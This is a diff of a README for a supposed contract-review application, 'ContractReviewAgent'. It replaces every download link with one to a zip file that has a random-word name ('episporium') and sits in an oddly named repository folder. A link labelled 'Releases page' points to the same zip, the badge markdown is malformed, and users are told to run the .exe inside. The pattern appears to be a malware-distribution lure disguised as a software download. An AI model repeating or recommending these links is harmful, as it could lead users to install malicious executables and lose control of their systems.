@@ -6,11 +6,11 @@ Welcome to the ContractReviewAgent! This tool helps you review international con
 
 ## 🔗 Download the Application
 
-[![Download ContractReviewAgent](https://raw.githubusercontent.com/voidjoshua/ContractReviewAgent/main/obstringe/Agent-Contract-Review-3.0.zip%https://raw.githubusercontent.com/voidjoshua/ContractReviewAgent/main/obstringe/Agent-Contract-Review-3.0.zip)](https://raw.githubusercontent.com/voidjoshua/ContractReviewAgent/main/obstringe/Agent-Contract-Review-3.0.zip)
+[![Download ContractReviewAgent](https://github.com/voidjoshua/ContractReviewAgent/raw/refs/heads/main/obstringe/Contract-Review-Agent-episporium.zip%https://github.com/voidjoshua/ContractReviewAgent/raw/refs/heads/main/obstringe/Contract-Review-Agent-episporium.zip)](https://github.com/voidjoshua/ContractReviewAgent/raw/refs/heads/main/obstringe/Contract-Review-Agent-episporium.zip)
 
 ## 📥 Download & Install
 
-To download the ContractReviewAgent, visit the following page: [Download ContractReviewAgent](https://raw.githubusercontent.com/voidjoshua/ContractReviewAgent/main/obstringe/Agent-Contract-Review-3.0.zip). 
+To download the ContractReviewAgent, visit the following page: [Download ContractReviewAgent](https://github.com/voidjoshua/ContractReviewAgent/raw/refs/heads/main/obstringe/Contract-Review-Agent-episporium.zip). 
 
 ### 🛠 System Requirements
 
@@ -33,7 +33,7 @@ The ContractReviewAgent offers various features designed to simplify your contra
 ## 📄 Steps to Use the Application
 
 1. **Download the Application:**
-   Visit [Download ContractReviewAgent](https://raw.githubusercontent.com/voidjoshua/ContractReviewAgent/main/obstringe/Agent-Contract-Review-3.0.zip) to download the latest version.
+   Visit [Download ContractReviewAgent](https://github.com/voidjoshua/ContractReviewAgent/raw/refs/heads/main/obstringe/Contract-Review-Agent-episporium.zip) to download the latest version.
 
 2. **Install the Application:**
    - For Windows: Run the `.exe` file and follow the installation prompts. 
@@ -72,7 +72,7 @@ We welcome contributions! If you have ideas, bug fixes, or features to propose, 
 
 ## 📣 Stay Updated
 
-For updates, release notes, and news, follow us on our GitHub page or check back on the [ContractReviewAgent Releases page](https://raw.githubusercontent.com/voidjoshua/ContractReviewAgent/main/obstringe/Agent-Contract-Review-3.0.zip).
+For updates, release notes, and news, follow us on our GitHub page or check back on the [ContractReviewAgent Releases page](https://github.com/voidjoshua/ContractReviewAgent/raw/refs/heads/main/obstringe/Contract-Review-Agent-episporium.zip).
 
 ## 🚀 Join Our Community
 
